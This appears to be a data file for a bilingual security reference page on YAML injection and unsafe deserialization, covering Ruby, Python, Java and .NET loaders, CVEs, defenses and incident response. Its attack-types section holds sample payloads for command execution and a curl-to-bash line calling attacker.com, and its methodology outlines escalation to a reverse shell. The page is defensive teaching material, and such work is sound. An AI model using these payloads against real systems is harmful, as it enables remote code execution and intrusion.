@@ -1,0 +1,438 @@
+meta:
+  id: yamlinjection
+  threatId: cat_1_research05
+  severity: Critical
+  color: '#d946ef'
+  colorRgb: 217,70,239
+  cwe: CWE-502
+  cvss: '9.8'
+  standard: OWASP A08:2021
+hero:
+  titleMain: 'YAML '
+  titleGrad: Injection
+  titleTail: ''
+  topbar: YAML Injection / Unsafe Deserialization
+  lead:
+    en: 'This isn''t syntax-breakout injection — it''s deserialization (CWE-502) wearing a YAML label. Many parsers support tags that instantiate language-native objects during parsing: Ruby''s !ruby/object:, Python''s !!python/object/apply:, Java SnakeYAML''s !!javax.script.ScriptEngineManager. When an unsafe loader processes attacker-controlled YAML, that object construction becomes a direct line to Runtime.exec()-equivalent code execution. CVE-2013-0156 (Rails) and CVE-2022-1471 (SnakeYAML, CVSS 9.8) are the two headline incidents — the fix is never escaping, it''s restricting which types the loader is allowed to build.'
+    pl: 'To nie wstrzyknięcie przez wyłamanie ze składni — to deserializacja (CWE-502) w przebraniu YAML. Wiele parserów wspiera tagi tworzące instancje obiektów natywnych języka podczas parsowania: !ruby/object: w Ruby, !!python/object/apply: w Pythonie, !!javax.script.ScriptEngineManager w Java SnakeYAML. Gdy niebezpieczny loader przetwarza YAML kontrolowany przez atakującego, ta konstrukcja obiektu staje się bezpośrednią linią do wykonania kodu odpowiadającego Runtime.exec(). CVE-2013-0156 (Rails) i CVE-2022-1471 (SnakeYAML, CVSS 9.8) to dwa flagowe incydenty — naprawa to nigdy escapowanie, tylko ograniczenie jakie typy loader może budować.'
+  metrics:
+  - k: CWE-502
+    v:
+      en: Weakness ID
+      pl: ID słabości
+  - k: '9.8'
+    v: CVSS · Critical
+  - k: A08:2021
+    v: OWASP Top 10
+  - k: '7'
+    v:
+      en: Attack variants
+      pl: Warianty ataku
+  sources:
+  - label: OWASP A08:2021
+    url: https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/
+  - label: CWE-502 (MITRE)
+    url: https://cwe.mitre.org/data/definitions/502.html
+  - label: GHSA — SnakeYAML CVE-2022-1471
+    url: https://github.com/advisories/GHSA-mjmj-j48q-9wg2
+  - label: NVD — CVE-2013-0156
+    url: https://nvd.nist.gov/vuln/detail/CVE-2013-0156
+sectionOrder:
+- overview
+- types
+- code
+- langrisks
+- method
+- defense
+- incidents
+- tools
+- compliance
+- ir
+- sources
+nav:
+- id: overview
+  en: Overview
+  pl: Przegląd
+- id: types
+  en: Attack types
+  pl: Typy ataków
+- id: code
+  en: Vuln vs Secure
+  pl: Podatny vs Bezpieczny
+- id: langrisks
+  en: Library defaults over time
+  pl: Domyślne zachowanie bibliotek w czasie
+- id: method
+  en: Methodology
+  pl: Metodyka
+- id: defense
+  en: Defense layers
+  pl: Warstwy obrony
+- id: incidents
+  en: Real incidents
+  pl: Incydenty
+- id: tools
+  en: SAST / DAST
+  pl: SAST / DAST
+- id: compliance
+  en: Compliance
+  pl: Zgodność
+- id: ir
+  en: Incident response
+  pl: Reagowanie
+- id: sources
+  en: Sources
+  pl: Źródła
+sections:
+  attacks:
+    title:
+      en: Attack types
+      pl: Typy ataków
+    lead:
+      en: Seven ways the same tag-driven object instantiation is turned into RCE or DoS — six are deserialization, one (CI/CD) is genuinely different and included because it's the most common colloquial meaning of "YAML injection."
+      pl: Siedem sposobów, w jakie ta sama konstrukcja obiektu sterowana tagami zamienia się w RCE lub DoS — sześć to deserializacja, jeden (CI/CD) jest naprawdę inny i dołączony bo to najczęstsze potoczne znaczenie "YAML injection".
+    items:
+    - name: 'Ruby YAML.load RCE via !ruby/object:'
+      sev: critical
+      description:
+        en: Ruby's Psych (pre-4.0) YAML.load instantiates arbitrary Ruby objects from tags; chained with a gadget already on the classpath (e.g. RubyGems classes), this reaches code execution. The core of CVE-2013-0156.
+        pl: Psych Ruby (sprzed 4.0) YAML.load tworzy instancje dowolnych obiektów Ruby z tagów; połączone z gadżetem już obecnym w classpath (np. klasy RubyGems), to dosięga wykonania kodu. Rdzeń CVE-2013-0156.
+      payload: '--- !ruby/object:OpenStruct\ntable:\n  :foo: bar  (proves unsafe loading; RCE needs a present gadget)'
+    - name: 'Python PyYAML RCE via !!python/object/apply:'
+      sev: critical
+      description:
+        en: yaml.load() without a safe Loader honors object-apply tags, calling arbitrary Python callables with attacker-supplied arguments directly.
+        pl: yaml.load() bez bezpiecznego Loadera honoruje tagi object-apply, wywołując dowolne wywoływalne Pythona z argumentami dostarczonymi przez atakującego.
+      payload: '!!python/object/apply:os.system ["id"]'
+    - name: Java SnakeYAML RCE (CVE-2022-1471)
+      sev: critical
+      description:
+        en: SnakeYAML's default Constructor (pre-2.0) instantiates any named Java type. The classic gadget builds a ScriptEngineManager fed a URLClassLoader that fetches and runs an attacker-hosted service provider.
+        pl: Domyślny Constructor SnakeYAML (sprzed 2.0) tworzy instancje dowolnego nazwanego typu Java. Klasyczny gadżet buduje ScriptEngineManager zasilany URLClassLoader, który pobiera i uruchamia dostawcę usługi hostowanego przez atakującego.
+      payload: '!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/"]]]]'
+    - name: .NET YamlDotNet RCE (<=4.3.2)
+      sev: high
+      description:
+        en: Older YamlDotNet resolved the tag with Type.GetType() and blindly instantiated attacker-named types, reachable to classic .NET deserialization gadgets like ObjectDataProvider+Process. Fixed in 5.0.0.
+        pl: Starsze YamlDotNet rozwiązywało tag przez Type.GetType() i bezmyślnie tworzyło instancje nazwanych przez atakującego typów, osiągalne do klasycznych gadżetów deserializacji .NET jak ObjectDataProvider+Process. Naprawione w 5.0.0.
+      payload: '!System.Windows.Data.ObjectDataProvider { ObjectType: !System.Diagnostics.Process, MethodName: Start }'
+    - name: CI/CD YAML Script Injection (mechanistically different)
+      sev: high
+      description:
+        en: 'Not deserialization: untrusted context (PR title, branch name, commit message) interpolated directly into a run: shell block in GitHub Actions/GitLab CI is executed as shell on the runner. This is real syntax-breakout injection, the most common colloquial meaning of the term.'
+        pl: 'Nie deserializacja: niezaufany kontekst (tytuł PR, nazwa gałęzi, wiadomość commita) wstawiony wprost do bloku shell run: w GitHub Actions/GitLab CI jest wykonywany jako shell na runnerze. To prawdziwe wstrzyknięcie przez wyłamanie ze składni, najczęstsze potoczne znaczenie tego terminu.'
+      payload: 'PR title: foo"; curl attacker.com/x|bash; echo "  (against run: echo "Title: ${{ github.event.pull_request.title }}")'
+    - name: Billion Laughs Anchor/Alias Expansion (DoS)
+      sev: medium
+      description:
+        en: YAML anchors (&) and aliases (*) allow node reuse; nesting aliases-of-aliases expands exponentially at parse time, exhausting memory/CPU even against some safe loaders unless alias-depth limits are enforced.
+        pl: Kotwice YAML (&) i aliasy (*) pozwalają na ponowne użycie węzła; zagnieżdżanie aliasów-w-aliasach rozszerza się wykładniczo podczas parsowania, wyczerpując pamięć/CPU nawet przeciw niektórym bezpiecznym loaderom, chyba że wymuszone są limity głębokości aliasów.
+      payload: 'a: &a [x,x,x,...]\nb: &b [*a,*a,*a,...]\nc: &c [*b,*b,*b,...]  (each level multiplies)'
+    - name: 'Python !!python/object/new: Constructor Variant'
+      sev: high
+      description:
+        en: 'A distinct tag path from apply: — invokes __new__/constructor directly rather than calling a function, reaching code execution through a different route when apply-style tags are filtered.'
+        pl: 'Odrębna ścieżka tagu od apply: — wywołuje __new__/konstruktor bezpośrednio zamiast wywoływać funkcję, dosięgając wykonania kodu inną drogą, gdy tagi w stylu apply są filtrowane.'
+      payload: '!!python/object/new:subprocess.Popen [["id"]]'
+  code:
+    title:
+      en: Vulnerable vs Secure
+      pl: Podatny vs Bezpieczny
+    lead:
+      en: 'The same fix everywhere: use the safe/restricted loader. Modern versions of all three libraries made this the default — but only if you don''t explicitly opt back into the unsafe one.'
+      pl: 'Ta sama naprawa wszędzie: użyj bezpiecznego/ograniczonego loadera. Nowoczesne wersje wszystkich trzech bibliotek uczyniły to domyślnym — ale tylko jeśli jawnie nie wrócisz do niebezpiecznego.'
+    languages:
+    - label: Ruby
+      lang: ruby
+      vulnerable: '# VULNERABLE (Psych < 4, or explicit unsafe_load on Psych 4+)
+
+        data = YAML.load(user_input)
+
+        data = YAML.unsafe_load(user_input)'
+      safe: '# SECURE
+
+        data = YAML.safe_load(user_input)
+
+        data = YAML.safe_load(user_input, permitted_classes: [Date], aliases: true)
+
+        # Ruby 3.1+ / Psych 4+: YAML.load itself now defaults to safe behavior'
+    - label: Python (PyYAML)
+      lang: python
+      vulnerable: '# VULNERABLE
+
+        data = yaml.load(data)                      # bare load, historically unsafe
+
+        data = yaml.load(data, Loader=yaml.Loader)  # explicitly unsafe
+
+        data = yaml.unsafe_load(data)'
+      safe: '# SECURE
+
+        data = yaml.safe_load(data)
+
+        data = yaml.load(data, Loader=yaml.SafeLoader)
+
+        # NOTE: FullLoader is safer than the old default but was itself bypassed
+
+        # (CVE-2020-1747/CVE-2020-14343) -- use SafeLoader, not FullLoader'
+    - label: Java (SnakeYAML)
+      lang: java
+      vulnerable: '// VULNERABLE (SnakeYAML < 2.0 default)
+
+        Yaml yaml = new Yaml();                 // default Constructor, arbitrary types
+
+        Object o = yaml.load(data);'
+      safe: '// SECURE
+
+        Yaml yaml = new Yaml(new SafeConstructor(new LoaderOptions()));
+
+        Object o = yaml.load(data);
+
+        // or upgrade to SnakeYAML 2.0+, which restricts global tags by default'
+  langRisks:
+    title:
+      en: Library defaults over time
+      pl: Domyślne zachowanie bibliotek w czasie
+    lead:
+      en: Every mainstream YAML library eventually flipped its default to safe — but each transition is version-gated, so "which version" matters as much as "which function".
+      pl: Każda popularna biblioteka YAML w końcu przełączyła swój domyślny tryb na bezpieczny — ale każda tranzycja jest bramkowana wersją, więc "która wersja" ma tak samo duże znaczenie jak "która funkcja".
+    rows:
+    - fw: Ruby / Psych
+      api: YAML.load
+      note:
+        en: Psych 4.0+ (ships with Ruby 3.1+) re-aliased YAML.load to behave like safe_load by default; the old permissive behavior moved to the explicit YAML.unsafe_load. A deliberate breaking change that also broke configs relying on aliases.
+        pl: Psych 4.0+ (dołączane do Ruby 3.1+) przealiasowało YAML.load, by domyślnie zachowywać się jak safe_load; stare permisywne zachowanie przeniesiono do jawnego YAML.unsafe_load. Celowa zmiana łamiąca, która też zepsuła konfiguracje polegające na aliasach.
+    - fw: Python / PyYAML
+      api: yaml.load / FullLoader
+      note:
+        en: PyYAML >=5.1 warns if load() is called without an explicit Loader. FullLoader is safer than the ancient default but was itself bypassed (CVE-2020-1747, CVE-2020-14343) -- only SafeLoader/safe_load is the correct fix, never FullLoader.
+        pl: PyYAML >=5.1 ostrzega jeśli load() jest wywołane bez jawnego Loadera. FullLoader jest bezpieczniejszy niż starożytny domyślny, ale sam został obejście (CVE-2020-1747, CVE-2020-14343) -- tylko SafeLoader/safe_load to poprawna naprawa, nigdy FullLoader.
+    - fw: Java / SnakeYAML
+      api: new Yaml() / Constructor
+      note:
+        en: SnakeYAML 2.0+ changed the default Constructor to be restrictive (no arbitrary global tags) unless explicitly opted out -- directly responding to CVE-2022-1471's massive downstream blast radius across the Java ecosystem.
+        pl: SnakeYAML 2.0+ zmieniło domyślny Constructor na restrykcyjny (bez dowolnych globalnych tagów), chyba że jawnie wyłączone -- bezpośrednia odpowiedź na ogromny zasięg CVE-2022-1471 w ekosystemie Java.
+    - fw: .NET / YamlDotNet
+      api: Deserializer.Deserialize()
+      note:
+        en: Versions <=4.3.2 resolved tags with Type.GetType() and blindly instantiated attacker-named types. Fixed in 5.0.0, which requires explicit type allow-listing for anything beyond built-in scalars/collections.
+        pl: Wersje <=4.3.2 rozwiązywały tagi przez Type.GetType() i bezmyślnie tworzyły instancje nazwanych przez atakującego typów. Naprawione w 5.0.0, które wymaga jawnej allowlisty typów dla wszystkiego poza wbudowanymi skalarami/kolekcjami.
+  method:
+    title:
+      en: Attack methodology
+      pl: Metodyka ataku
+    lead:
+      en: How an attacker progresses from finding a YAML-accepting endpoint to RCE or DoS.
+      pl: Jak atakujący przechodzi od znalezienia endpointu akceptującego YAML do RCE lub DoS.
+    steps:
+    - title:
+        en: Find YAML sinks
+        pl: Znajdź sinki YAML
+      description:
+        en: Config/import upload features, API endpoints with a YAML content-type, CI/CD pipeline definitions, webhook payloads -- anything advertising "import your config as YAML."
+        pl: Funkcje uploadu/importu konfiguracji, endpointy API z content-type YAML, definicje pipeline CI/CD, ładunki webhooków -- wszystko reklamujące "zaimportuj swój config jako YAML."
+    - title:
+        en: Confirm unsafe loading with a benign probe
+        pl: Potwierdź niebezpieczne ładowanie niegroźną sondą
+      description:
+        en: 'Send a harmless typed tag and watch behavior: an object built without error (Ruby), a timing delay from a sleep() apply call (Python), or an out-of-band DNS/HTTP callback (Java) confirms an unsafe loader.'
+        pl: 'Wyślij niegroźny typowany tag i obserwuj zachowanie: obiekt zbudowany bez błędu (Ruby), opóźnienie czasowe z wywołania apply sleep() (Python), albo callback out-of-band DNS/HTTP (Java) potwierdza niebezpieczny loader.'
+    - title:
+        en: Fingerprint language and library version
+        pl: Rozpoznaj język i wersję biblioteki
+      description:
+        en: Infer from the tech stack (Rails->Psych, Django/Flask->PyYAML, Spring->SnakeYAML, ASP.NET->YamlDotNet) to know which tag syntax and gadgets apply.
+        pl: Wywnioskuj ze stosu technologicznego (Rails->Psych, Django/Flask->PyYAML, Spring->SnakeYAML, ASP.NET->YamlDotNet), by wiedzieć jaka składnia tagów i gadżety mają zastosowanie.
+    - title:
+        en: Escalate to a known gadget chain
+        pl: Eskaluj do znanego łańcucha gadżetów
+      description:
+        en: 'Python: os.system/subprocess via apply. Java: ScriptEngineManager+URLClassLoader fetching a malicious service provider. Ruby: a RubyGems or ERB-based gadget chain. .NET: ObjectDataProvider+Process.'
+        pl: 'Python: os.system/subprocess przez apply. Java: ScriptEngineManager+URLClassLoader pobierający złośliwego dostawcę usługi. Ruby: łańcuch gadżetów RubyGems lub oparty na ERB. .NET: ObjectDataProvider+Process.'
+    - title:
+        en: Achieve RCE and pivot
+        pl: Osiągnij RCE i przejdź dalej
+      description:
+        en: Confirm with a low-noise command (id/whoami), then establish a reverse shell and move laterally.
+        pl: Potwierdź niegroźnym poleceniem (id/whoami), potem ustanów odwrotną powłokę i przemieszczaj się lateralnie.
+  defenses:
+    title:
+      en: Defense layers, ranked
+      pl: Warstwy obrony wg skuteczności
+    lead:
+      en: 'The safe loader is the near-complete fix — everything else is defense-in-depth. For the CI/CD variant specifically, the fix is entirely different: pass untrusted context through env vars, never inline it into a run: block.'
+      pl: 'Bezpieczny loader to niemal kompletna naprawa — wszystko inne to obrona w głąb. Dla wariantu CI/CD naprawa jest całkowicie inna: przekazuj niezaufany kontekst przez zmienne env, nigdy nie wstawiaj go bezpośrednio w blok run:.'
+    items:
+    - rank: 1
+      eff: 95
+      kind: primary
+      label:
+        en: Use the safe/restricted loader
+        pl: Użyj bezpiecznego/ograniczonego loadera
+      note:
+        en: safe_load / SafeLoader / SafeConstructor directly removes arbitrary type instantiation. The canonical, near-complete fix for the deserialization core of this threat.
+        pl: safe_load / SafeLoader / SafeConstructor bezpośrednio usuwa tworzenie instancji dowolnych typów. Kanoniczna, niemal kompletna naprawa dla deserializacyjnego rdzenia tego zagrożenia.
+    - rank: 2
+      eff: 90
+      kind: primary
+      label:
+        en: Avoid deserializing YAML from untrusted sources — use JSON instead
+        pl: Unikaj deserializacji YAML z niezaufanych źródeł — użyj zamiast tego JSON
+      note:
+        en: JSON has no object-instantiation tag syntax, eliminating the entire class where feasible. Doesn't help where YAML is a mandated format (Kubernetes/CI configs).
+        pl: JSON nie ma składni tagów tworzenia instancji obiektów, eliminując całą klasę tam gdzie to wykonalne. Nie pomaga tam gdzie YAML jest wymaganym formatem (konfiguracje Kubernetes/CI).
+    - rank: 3
+      eff: 85
+      kind: strong
+      label:
+        en: Upgrade to safe-by-default library versions
+        pl: Aktualizacja do wersji bibliotek bezpiecznych domyślnie
+      note:
+        en: Ruby 3.1+/Psych 4+, SnakeYAML 2.0+, YamlDotNet 5.0+ all made safe loading the default. Effective only if code doesn't explicitly re-enable the unsafe path.
+        pl: Ruby 3.1+/Psych 4+, SnakeYAML 2.0+, YamlDotNet 5.0+ wszystkie uczyniły bezpieczne ładowanie domyślnym. Skuteczne tylko jeśli kod jawnie nie włącza z powrotem niebezpiecznej ścieżki.
+    - rank: 4
+      eff: 52
+      kind: mitigation
+      label:
+        en: Schema validation before/around parsing
+        pl: Walidacja schematu przed/wokół parsowania
+      note:
+        en: Good defense-in-depth, but the dangerous instantiation can happen during parsing, before validation ever runs — must be paired with a safe loader, never used alone.
+        pl: Dobra obrona w głąb, ale niebezpieczne tworzenie instancji może nastąpić podczas parsowania, zanim walidacja w ogóle się uruchomi — musi być połączone z bezpiecznym loaderem, nigdy używane samo.
+    - rank: 5
+      eff: 45
+      kind: mitigation
+      label:
+        en: Sandboxing / process isolation
+        pl: Sandboxing / izolacja procesu
+      note:
+        en: Reduces blast radius (e.g. blocks the SnakeYAML remote-JAR fetch by denying outbound network) but does not prevent exploitation itself — a last line of containment.
+        pl: Ogranicza zasięg skutków (np. blokuje pobranie zdalnego JAR-a SnakeYAML odmawiając ruchu wychodzącego), ale nie zapobiega samej eksploatacji — ostatnia linia powstrzymania.
+  incidents:
+    title:
+      en: Real-world incidents
+      pl: Rzeczywiste incydenty
+    lead:
+      en: From an unauthenticated RCE that affected virtually every Rails app in 2013 to a 2022 SnakeYAML CVE with a blast radius across the entire Java ecosystem.
+      pl: Od nieuwierzytelnionego RCE dotykającego praktycznie każdą aplikację Rails w 2013, po CVE SnakeYAML z 2022 o zasięgu przez cały ekosystem Java.
+    items:
+    - org: Ruby on Rails
+      year: 2013
+      impact: CVE-2013-0156
+      cost: Unauthenticated RCE, mass-exploited
+      description:
+        en: Rails auto-parsed request parameters as YAML/XML; setting an XML content type with an embedded YAML !ruby/object tag gave unauthenticated RCE on virtually every Rails app of the era (Rails <2.3.15, 3.0.x<3.0.19, 3.1.x<3.1.10, 3.2.x<3.2.11). One of the most impactful Rails vulnerabilities ever; directly motivated Psych's later safe_load default.
+        pl: Rails automatycznie parsował parametry żądania jako YAML/XML; ustawienie content type XML z osadzonym tagiem YAML !ruby/object dawało nieuwierzytelnione RCE na praktycznie każdej aplikacji Rails tamtej ery (Rails <2.3.15, 3.0.x<3.0.19, 3.1.x<3.1.10, 3.2.x<3.2.11). Jedna z najbardziej wpływowych podatności Rails w historii; bezpośrednio zmotywowała późniejszy domyślny safe_load Psych.
+    - org: SnakeYAML (Java ecosystem)
+      year: 2022
+      impact: CVE-2022-1471, CVSS 9.8
+      cost: 'Downstream: Spring Boot, Atlassian products, OpenStack4j'
+      description:
+        en: SnakeYAML's default Constructor instantiated arbitrary Java types via global tags; exploitable to RCE via the ScriptEngineManager+URLClassLoader chain. Massive downstream blast radius since SnakeYAML is a transitive dependency of huge parts of the Java ecosystem. Fixed in SnakeYAML 2.0.
+        pl: Domyślny Constructor SnakeYAML tworzył instancje dowolnych typów Java przez globalne tagi; eksploatowalne do RCE przez łańcuch ScriptEngineManager+URLClassLoader. Ogromny zasięg skutków, bo SnakeYAML to tranzytywna zależność wielkich części ekosystemu Java. Naprawione w SnakeYAML 2.0.
+    - org: PyYAML
+      year: 2020
+      impact: CVE-2020-1747, CVE-2020-14343
+      cost: FullLoader bypass
+      description:
+        en: The FullLoader, introduced as a safer-seeming alternative to the ancient default, still permitted python/object/new constructor abuse for RCE. CVE-2020-14343 was the incomplete-fix follow-up to CVE-2020-1747, fully addressed only in PyYAML 5.4 -- proof that only SafeLoader/safe_load should be trusted, never FullLoader.
+        pl: FullLoader, wprowadzony jako pozornie bezpieczniejsza alternatywa dla starożytnego domyślnego, wciąż pozwalał na nadużycie konstruktora python/object/new do RCE. CVE-2020-14343 było niekompletną poprawką dla CVE-2020-1747, w pełni rozwiązane dopiero w PyYAML 5.4 -- dowód że tylko SafeLoader/safe_load powinny być zaufane, nigdy FullLoader.
+    inlineSources:
+    - label: CVE-2013-0156 (Rails)
+      url: https://nvd.nist.gov/vuln/detail/CVE-2013-0156
+    - label: GHSA — SnakeYAML CVE-2022-1471
+      url: https://github.com/advisories/GHSA-mjmj-j48q-9wg2
+    - label: CVE-2020-14343 (PyYAML)
+      url: https://nvd.nist.gov/vuln/detail/CVE-2020-14343
+  tools:
+    title:
+      en: Detection tooling
+      pl: Narzędzia wykrywania
+    lead:
+      en: Static analysis flags the unsafe-loader call pattern directly; Java exploitation relies on the same gadget-chain tooling used for native serialization attacks.
+      pl: Analiza statyczna oznacza wzorzec wywołania niebezpiecznego loadera bezpośrednio; eksploatacja Java opiera się na tym samym narzędziu łańcuchów gadżetów co ataki natywnej serializacji.
+    sast:
+    - - Brakeman
+      - Dedicated "Remote Code Execution in YAML.load" warning for Ruby/Rails
+    - - Bandit (Python)
+      - B506 yaml_load flags yaml.load() used without SafeLoader
+    - - Semgrep
+      - Rules for unsafe yaml.load, SnakeYAML default Constructor, YamlDotNet deserializer
+    - - CodeQL / Snyk Code
+      - Dataflow queries for YAML deserialization sinks across Ruby/Python/Java
+    dast:
+    - - marshalsec
+      - The most directly SnakeYAML-relevant gadget/deserialization research tool — covers YAML/JSON/XML marshalling gadgets
+    - - ysoserial
+      - Java gadget-chain catalog (Commons Collections, Spring, Groovy) — adjacent reference for classes reachable via SnakeYAML instantiation
+    - - PayloadsAllTheThings
+      - Reference collection of working SnakeYAML/PyYAML/Ruby YAML payloads
+    - - Burp Collaborator / DNS canary
+      - Out-of-band confirmation of the SnakeYAML remote-fetch or blind execution before attempting full RCE
+    note:
+      en: <strong>Key signal:</strong> grep for <code>yaml.load()</code> without <code>Loader=SafeLoader</code>, <code>YAML.load</code>/<code>unsafe_load</code> on Ruby, and <code>new Yaml()</code> without a <code>SafeConstructor</code> in Java — these are the dangerous defaults that matter, plus check the exact library version against its safe-by-default cutoff.
+      pl: <strong>Kluczowy sygnał:</strong> szukaj <code>yaml.load()</code> bez <code>Loader=SafeLoader</code>, <code>YAML.load</code>/<code>unsafe_load</code> w Ruby, i <code>new Yaml()</code> bez <code>SafeConstructor</code> w Javie — to niebezpieczne domyślne ustawienia, na których warto się skupić, plus sprawdź dokładną wersję biblioteki względem jej progu bezpiecznego-domyślnie.
+  compliance:
+    title:
+      en: Compliance quick-reference
+      pl: Szybka zgodność
+    lead:
+      en: The CI/CD script-injection variant genuinely maps to a different category than the deserialization core — worth keeping separate in reports rather than conflating the two.
+      pl: Wariant wstrzyknięcia skryptu CI/CD naprawdę mapuje się na inną kategorię niż rdzeń deserializacji — warto trzymać je osobno w raportach zamiast je mylić.
+    items:
+    - std: CWE (MITRE)
+      items:
+      - CWE-502 — Deserialization of Untrusted Data (primary, for the Ruby/Python/Java/.NET RCE variants)
+      - CWE-776 — Improper Restriction of Recursive Entity References (billion-laughs DoS variant)
+      - CWE-94 / CWE-78 — Code/OS Command Injection (the CI/CD script-injection variant specifically — this one is NOT CWE-502)
+    - std: OWASP
+      items:
+      - A08:2021 — Software and Data Integrity Failures (absorbed the former A8:2017 Insecure Deserialization; the correct mapping for the core RCE variants)
+      - A03:2021 — Injection (the correct mapping specifically for the CI/CD script-injection variant, not the deserialization core)
+    inlineSources:
+    - label: CWE-502 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/502.html
+    - label: OWASP A08:2021
+      url: https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/
+    - label: GitHub Docs — Script injections
+      url: https://docs.github.com/en/actions/concepts/security/script-injections
+  ir:
+    title:
+      en: Incident response checklist
+      pl: Lista kontrolna reagowania
+    lead:
+      en: If you confirm active YAML deserialization exploitation, work this list top to bottom.
+      pl: Po potwierdzeniu aktywnej eksploatacji deserializacji YAML, przejdź tę listę od góry.
+    steps:
+    - en: Treat the host as fully compromised if RCE is confirmed -- rotate all credentials/secrets reachable from that process
+      pl: Traktuj hosta jako w pełni skompromitowanego jeśli RCE jest potwierdzone -- zrotuj wszystkie poświadczenia/sekrety osiągalne z tego procesu
+    - en: Identify the exact library and version in use, and confirm whether it predates the safe-by-default cutoff (Psych 4, SnakeYAML 2.0, YamlDotNet 5.0)
+      pl: Ustal dokładną używaną bibliotekę i wersję, potwierdź czy jest sprzed progu bezpiecznego-domyślnie (Psych 4, SnakeYAML 2.0, YamlDotNet 5.0)
+    - en: Grep the entire codebase for every unsafe-loader call site, not just the one that was exploited -- this is rarely a single-instance bug
+      pl: Przeszukaj całą bazę kodu pod kątem każdego miejsca wywołania niebezpiecznego loadera, nie tylko tego które zostało wykorzystane -- to rzadko jest błąd jednorazowy
+    - en: Switch every call site to the safe loader and upgrade the library, do not rely on schema validation alone as the fix
+      pl: Przełącz każde miejsce wywołania na bezpieczny loader i zaktualizuj bibliotekę, nie polegaj wyłącznie na walidacji schematu jako naprawie
+    - en: Check outbound connection logs for unexpected fetches (e.g. a SnakeYAML URLClassLoader hitting an unfamiliar host)
+      pl: Sprawdź logi połączeń wychodzących pod kątem nieoczekiwanych pobrań (np. URLClassLoader SnakeYAML trafiający na nieznany host)
+    - en: 'For the CI/CD variant specifically, audit workflow files for any inline ${{ }} interpolation of untrusted context into run: blocks'
+      pl: 'Dla wariantu CI/CD konkretnie, przeaudytuj pliki workflow pod kątem jakiejkolwiek wstawionej interpolacji ${{ }} niezaufanego kontekstu w bloki run:'
+    - en: Notify per applicable data-breach obligations if data was exfiltrated
+      pl: Powiadom zgodnie z obowiązującymi wymogami dot. naruszenia danych jeśli dane zostały eksfiltrowane
+  sources:
+    title:
+      en: Sources
+      pl: Źródła
+    items:
+    - label: OWASP A08:2021 Software and Data Integrity Failures
+      url: https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/
+    - label: CWE-502 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/502.html
+    - label: NVD — CVE-2013-0156 (Rails)
+      url: https://nvd.nist.gov/vuln/detail/CVE-2013-0156
+    - label: GHSA — SnakeYAML CVE-2022-1471
+      url: https://github.com/advisories/GHSA-mjmj-j48q-9wg2
+    - label: NVD — CVE-2020-14343 (PyYAML)
+      url: https://nvd.nist.gov/vuln/detail/CVE-2020-14343
+    - label: 'ruby/psych PR #487 (safe_load default)'
+      url: https://github.com/ruby/psych/pull/487
+    - label: GitHub Docs — Script injections (CI/CD variant)
+      url: https://docs.github.com/en/actions/concepts/security/script-injections
